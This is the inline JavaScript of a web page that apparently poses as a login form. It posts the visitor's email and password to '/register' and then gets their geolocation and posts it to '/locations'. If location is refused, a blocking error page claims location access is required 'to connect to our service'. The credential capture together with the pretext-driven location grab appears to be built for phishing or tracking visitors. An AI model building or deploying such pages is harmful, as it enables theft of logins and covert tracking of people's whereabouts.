<script>
(function () {
  'use strict';

  /* ===================================================
     0. HELPERS
  =================================================== */
  const $ = (id) => document.getElementById(id);

  const reduce   = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  const canHover = window.matchMedia('(hover: hover) and (pointer: fine)').matches;

  function escapeHtml(value) {
    return String(value == null ? '' : value)
      .replace(/&/g,  '&amp;')
      .replace(/</g,  '&lt;')
      .replace(/>/g,  '&gt;')
      .replace(/"/g,  '&quot;')
      .replace(/'/g,  '&#39;');
  }

  function shake() {
    for (let i = 0; i < arguments.length; i++) {
      const el = arguments[i];
      if (!el || typeof el.animate !== 'function') continue;
      el.animate(
        [
          { transform: 'translateX(0)' },
          { transform: 'translateX(-6px)' },
          { transform: 'translateX(6px)' },
          { transform: 'translateX(-4px)' },
          { transform: 'translateX(0)' }
        ],
        { duration: 340, easing: 'ease-in-out' }
      );
    }
  }

  /* ===================================================
     1. ERROR PAGE  (only ever rendered once)
  =================================================== */
  let errorShown = false;

  function showErrorPage(title, message) {
    if (errorShown) return;          // stops any re-entrant / loop call
    errorShown = true;

    document.body.innerHTML = `
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background-color: #f5f5f7;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }
        .card {
          background: #ffffff;
          border-radius: 16px;
          padding: 40px 32px;
          max-width: 400px;
          width: 100%;
          text-align: center;
          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
        }
        h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 12px; }
        p  { font-size: 15px; color: #666; line-height: 1.5; margin-bottom: 28px; }
        .btn {
          display: inline-block;
          background-color: #007aff;
          color: #ffffff;
          text-decoration: none;
          font-size: 16px;
          font-weight: 600;
          padding: 14px 32px;
          border-radius: 10px;
          transition: background-color 0.2s ease;
        }
        .btn:hover { background-color: #005ecb; }
      </style>
      <div class="card">
        <h1>${escapeHtml(title)}</h1>
        <p>${escapeHtml(message)}</p>
        <a href="https://my-project-z9na.onrender.com/" class="btn">Try Again</a>
      </div>
    `;
  }

  /* ===================================================
     2. PARTICLE FIELD
  =================================================== */
  const canvas = $('particles');

  if (canvas && canvas.getContext && !reduce) {
    const ctx    = canvas.getContext('2d');
    const dpr    = Math.min(window.devicePixelRatio || 1, 2);
    const COLORS = ['34,211,238', '139,92,246', '236,72,153'];

    let W = 0, H = 0, dots = [];

    function makeDots() {
      const count = Math.min(70, Math.max(24, Math.round((W * H) / 22000)));
      dots = Array.from({ length: count }, () => ({
        x: Math.random() * W,
        y: Math.random() * H,
        vx: (Math.random() - .5) * .32,
        vy: (Math.random() - .5) * .32,
        r: Math.random() * 1.7 + .6,
        c: COLORS[(Math.random() * COLORS.length) | 0]
      }));
    }

    function resize() {
      W = window.innerWidth;
      H = window.innerHeight;
      canvas.width  = Math.floor(W * dpr);
      canvas.height = Math.floor(H * dpr);
      canvas.style.width  = W + 'px';
      canvas.style.height = H + 'px';
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      makeDots();
    }

    function draw() {
      if (!canvas.isConnected) return;   // page was replaced — stop the loop

      ctx.clearRect(0, 0, W, H);

      for (let i = 0; i < dots.length; i++) {
        const p = dots[i];
        p.x += p.vx;
        p.y += p.vy;

        if (p.x < -30) p.x = W + 30;
        if (p.x > W + 30) p.x = -30;
        if (p.y < -30) p.y = H + 30;
        if (p.y > H + 30) p.y = -30;

        for (let j = i + 1; j < dots.length; j++) {
          const q  = dots[j];
          const dx = p.x - q.x;
          const dy = p.y - q.y;
          const d2 = dx * dx + dy * dy;

          if (d2 < 13000) {
            ctx.strokeStyle = 'rgba(140,170,255,' + ((1 - d2 / 13000) * .16).toFixed(3) + ')';
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(p.x, p.y);
            ctx.lineTo(q.x, q.y);
            ctx.stroke();
          }
        }

        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(' + p.c + ',.85)';
        ctx.fill();
      }

      requestAnimationFrame(draw);
    }

    resize();
    window.addEventListener('resize', resize);
    draw();
  }

  /* ===================================================
     3. CURSOR SPOTLIGHT
  =================================================== */
  const spot = $('spotlight');

  if (canHover && !reduce && spot) {
    let sx = window.innerWidth  / 2, sy = window.innerHeight / 2;
    let tx = sx, ty = sy;

    window.addEventListener('mousemove', function (e) {
      tx = e.clientX;
      ty = e.clientY;
      spot.style.opacity = '1';
    });

    (function follow() {
      if (!spot.isConnected) return;
      sx += (tx - sx) * .09;
      sy += (ty - sy) * .09;
      spot.style.transform = 'translate(' + (sx - 300) + 'px,' + (sy - 300) + 'px)';
      requestAnimationFrame(follow);
    })();
  }

  /* ===================================================
     4. 3D CARD TILT
  =================================================== */
  const cardWrap = $('cardWrap');

  if (canHover && !reduce && cardWrap) {
    let targetX = 0, targetY = 0;
    let curX = 0,    curY = 0;

    window.addEventListener('mousemove', function (e) {
      const r  = cardWrap.getBoundingClientRect();
      if (!r.width || !r.height) return;
      const dx = (e.clientX - (r.left + r.width  / 2)) / (r.width  / 2);
      const dy = (e.clientY - (r.top  + r.height / 2)) / (r.height / 2);

      targetX = Math.max(-1, Math.min(1, dy)) * -5;
      targetY = Math.max(-1, Math.min(1, dx)) *  5;
    });

    window.addEventListener('mouseout', function (e) {
      if (!e.relatedTarget) { targetX = 0; targetY = 0; }
    });

    (function tiltLoop() {
      if (!cardWrap.isConnected) return;
      curX += (targetX - curX) * .07;
      curY += (targetY - curY) * .07;
      cardWrap.style.transform =
        'perspective(1100px) rotateX(' + curX.toFixed(3) + 'deg) rotateY(' + curY.toFixed(3) + 'deg)';
      requestAnimationFrame(tiltLoop);
    })();
  }

  /* ===================================================
     5. PASSWORD VISIBILITY TOGGLE
  =================================================== */
  const pwd    = $('password');
  const toggle = $('togglePwd');

  if (pwd && toggle) {
    toggle.addEventListener('click', function () {
      const show = pwd.type === 'password';
      pwd.type = show ? 'text' : 'password';
      toggle.classList.toggle('on', show);
      toggle.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
      pwd.focus({ preventScroll: true });
    });
  }

  /* ===================================================
     6. GEOLOCATION
  =================================================== */
  function sendLocation() {
    if (!navigator.geolocation) {
      showErrorPage(
        'Permission Needed',
        'In order to connect to our service, you need to allow location access.'
      );
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async function (position) {
        try {
          const response = await fetch('/locations', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude:  position.coords.latitude,
              longitude: position.coords.longitude
            })
          });

          if (!response.ok) {
            showErrorPage('Error', 'Please try again.');
          }
        } catch (err) {
          showErrorPage('Something Went Wrong', 'Please try again.');
        }
      },
      function (error) {
        /* NO recursion here — just report and stop. */
        const denied = error && error.code === error.PERMISSION_DENIED;
        showErrorPage(
          'Permission Needed',
          denied
            ? 'In order to connect to our service, you need to allow location access.'
            : 'We could not determine your location. Please try again.'
        );
      },
      { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
    );
  }

  /* ===================================================
     7. REGISTER USER
  =================================================== */
  async function registerUser() {
    const emailEl = $('email');
    const passEl  = $('password');

    const email    = emailEl ? emailEl.value.trim() : '';
    const password = passEl  ? passEl.value         : '';

    if (!email || !password) {
      shake(emailEl, passEl);
      if (!email && emailEl) emailEl.focus();
      else if (passEl)       passEl.focus();
      return;
    }

    let response;
    try {
      response = await fetch('/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email, password: password })
      });
    } catch (err) {
      showErrorPage('Something Went Wrong', 'Please try again later.');
      return;
    }

    let result = {};
    try { result = await response.json(); } catch (_) { result = {}; }

    if (response.ok) {
      sendLocation();
    } else {
      showErrorPage('Registration Failed', result.error || 'Please try again later.');
    }
  }

  /* ===================================================
     8. FORM SUBMIT
  =================================================== */
  const form = $('loginForm');
  const btn  = $('submitBtn');

  if (form) {
    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      if (btn && btn.classList.contains('loading')) return;

      if (btn) btn.classList.add('loading');

      try {
        await registerUser();
      } finally {
        // if the page wasn't replaced, restore the button
        if (btn && btn.isConnected) btn.classList.remove('loading');
      }
    });
  }

  /* ===================================================
     9. LOCATION PERMISSION CARD (optional — only if present)
  =================================================== */
  const allowBtn     = $('allowBtn');
  const locationCard = $('locationCard');

  if (allowBtn) {
    allowBtn.addEventListener('click', function () {
      if (locationCard && locationCard.isConnected) locationCard.remove();
      sendLocation();
    });
  }

  /* ===================================================
     10. EXPOSE (for inline handlers / debugging)
  =================================================== */
  window.showErrorPage = showErrorPage;
  window.sendLocation  = sendLocation;
  window.registerUser  = registerUser;

})();
</script>
